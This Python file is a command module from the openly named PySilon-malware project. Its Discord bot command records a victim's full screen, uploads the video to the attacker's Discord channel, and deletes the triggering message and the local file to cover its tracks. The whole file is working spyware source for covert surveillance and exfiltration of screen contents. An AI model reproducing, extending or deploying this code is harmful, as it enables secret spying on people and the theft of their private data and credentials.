#<imports>
import pyautogui
import numpy as np
import subprocess
import os
import imageio
#</imports>

@client.command(name="screenrec")
async def screen_record(ctx, duration=None):
    if duration != None:
        try:
            duration = int(duration)
        except: return
        if duration > 60:
            embed = discord.Embed(title="📛 Error",description="Duration interval should not surpass 60 seconds!", colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            return await ctx.send(embed=embed)
        elif duration < 1:
            embed = discord.Embed(title="📛 Error",description="Duration interval should be a non negative number!", colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            return await ctx.send(embed=embed)
    else:
        duration = 15 # default duration
    await ctx.message.delete()
    await ctx.send("`🟢 Recording... Please wait.`")

    output_file = 'recording.mp4'
    screen_width, screen_height = pyautogui.size()
    screen_region = (0, 0, screen_width, screen_height)
    frames = []
    fps = 30
    num_frames = duration * fps
    try:
        for _ in range(num_frames):
            img = pyautogui.screenshot(region=screen_region)
            frame = np.array(img)
            frames.append(frame)
        imageio.mimsave(output_file, frames, fps=fps, quality=8)
        if os.stat(output_file).st_size / (1024 * 1024) > 8:
            embed = discord.Embed(title="📛 Error",description="File size has exceeded 8MB! Please try a different duration. (Default: 15 seconds)", colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        else:
            await ctx.send("**Screen Recording** `[On demand]`", file=discord.File(output_file))
        subprocess.run(f'del {output_file}', shell=True)
    except:
        embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)